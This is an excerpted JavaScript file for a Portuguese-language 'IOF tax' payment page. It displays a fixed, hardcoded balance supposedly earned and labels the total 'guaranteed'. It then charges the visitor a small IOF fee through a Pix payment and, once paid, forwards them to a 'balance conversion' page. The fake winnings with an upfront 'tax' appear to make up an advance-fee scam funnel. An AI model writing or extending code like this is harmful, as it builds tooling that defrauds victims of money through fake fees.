// JavaScript para página de Imposto IOF
...
if (typeof window.impostoIofSupabase === 'undefined') {
    window.impostoIofSupabase = null;
}

const EARNED_VALUE = 2834.72; // Valor ganho
const IOF_FEE = 32.27; // Taxa IOF
const TOTAL_VALUE = EARNED_VALUE + IOF_FEE; // Total a receber
...
function getUrlParams() {
    ...
    return {
        ...
        amount: parseFloat(params.get('amount')) || EARNED_VALUE
    };
}
...
async function createPixPayment(amount, payerName, pixKey, pixKeyType, supabaseClient = null) {
    try {
        const client = supabaseClient || window.impostoIofSupabase;
        if (!client) {
        ...
        const { data, error } = await client.functions.invoke('bright-api', {
            body: {
                amount: amount,
                description: 'Imposto sobre Operações Financeiras (IOF)',
                payerName: payerName,
                pixKey: pixKey,
...
function initSupabase() {
    if (window.supabase && !window.impostoIofSupabase) {
        try {
            window.impostoIofSupabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
                auth: {
    ...
    return window.impostoIofSupabase;
}
...
window.addEventListener('load', () => {
    ...
    const totalValueTextEl = document.getElementById('totalValueText');
    const guaranteedValueEl = document.getElementById('guaranteedValue');

    if (earnedValueEl) earnedValueEl.textContent = formatCurrency(EARNED_VALUE);
    if (iofValueEl) iofValueEl.textContent = `- ${formatCurrency(IOF_FEE)}`;
    if (totalValueEl) totalValueEl.textContent = formatCurrency(TOTAL_VALUE);
    if (totalValueTextEl) totalValueTextEl.textContent = formatCurrency(TOTAL_VALUE);
    if (guaranteedValueEl) guaranteedValueEl.textContent = formatCurrency(TOTAL_VALUE);
    ...
    async function processPixPayment() {
        try {
            ...
            const paymentData = await createPixPayment(IOF_FEE, params.name, params.pixKey, params.pixKeyType, supabaseClient);

            if (paymentData && paymentData.paymentId) {
                monitorPaymentConfirmation(paymentData.paymentId, (confirmation) => {
                    showPixConfirmed(() => {
                        const nextUrl = `conversao-saldo.html?name=${encodeURIComponent(params.name)}&pixKey=${encodeURIComponent(params.pixKey)}&pixKeyType=${encodeURIComponent(params.pixKeyType)}`;
                        window.location.href = nextUrl;
                    });
                }, supabaseClient);

                showPixModal(paymentData, IOF_FEE);
            } else {
    ...
    // Botão pagar IOF
    const payIofBtn = document.getElementById('payIofBtn');
    if (payIofBtn) {
        payIofBtn.addEventListener('click', processPixPayment);
    }
